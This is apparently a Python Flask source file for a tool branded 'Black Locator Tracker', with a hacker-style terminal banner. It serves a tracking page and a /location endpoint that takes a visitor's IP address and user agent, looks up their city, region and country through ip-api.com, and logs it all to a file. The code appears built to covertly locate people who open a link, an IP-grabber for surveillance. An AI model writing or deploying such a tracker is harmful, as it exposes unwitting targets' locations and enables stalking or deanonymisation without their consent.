from flask import Flask, request, send_from_directory
from flask_cors import CORS
from datetime import datetime
import requests
import os

app = Flask(__name__, static_folder="static")
CORS(app)

# =======================[ COLORS ]=======================
RED = "\033[91m"
RESET = "\033[0m"

# =======================[ BANNER ]=======================
def show_banner():
    os.system("clear")  # Clear terminal
    print(f"""{RED}
██████╗ ██╗      █████╗  ██████╗ ██╗  ██╗     ██████╗  █████╗  ██████╗████████╗███████╗██████╗ 
██╔══██╗██║     ██╔══██╗██╔════╝ ██║  ██║    ██╔════╝ ██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
██████╔╝██║     ███████║██║  ███╗███████║    ██║  ███╗███████║██║        ██║   █████╗  ██████╔╝
██╔═══╝ ██║     ██╔══██║██║   ██║██╔══██║    ██║   ██║██╔══██║██║        ██║   ██╔══╝  ██╔══██╗
██║     ███████╗██║  ██║╚██████╔╝██║  ██║    ╚██████╔╝██║  ██║╚██████╗   ██║   ███████╗██║  ██║
╚═╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝     ╚═════╝ ╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
{RESET}
🔍 Black Locator Tracker is running at: http://0.0.0.0:5000
""")

# =======================[ ROUTES ]=======================

@app.route('/location', methods=['POST'])
def location():
    data = request.json
    ip = data.get("ip")
    ua = data.get("userAgent")
    ip_type = "IPv6" if ":" in ip else "IPv4"

    # Fetch geolocation
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        location_data = response.json()
        city = location_data.get("city", "Unknown")
        region = location_data.get("regionName", "")
        country = location_data.get("country", "")
    except Exception:
        city = region = country = "Unknown"

    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Log to file
    with open("visitor_logs.txt", "a") as f:
        f.write(f"[{time}] IP: {ip} ({ip_type}), Location: {city}, {region}, {country}, UA: {ua}\n")

    return "Logged", 200

@app.route('/track.html')
def track_page():
    return send_from_directory(app.static_folder, "track.html")

@app.route('/')
def home():
    return "<h3>✅ Flask server is running - Black Locator Tracker</h3>"

# =======================[ ENTRY POINT ]=======================

if __name__ == '__main__':
    show_banner()
    app.run(host='0.0.0.0', port=5000)
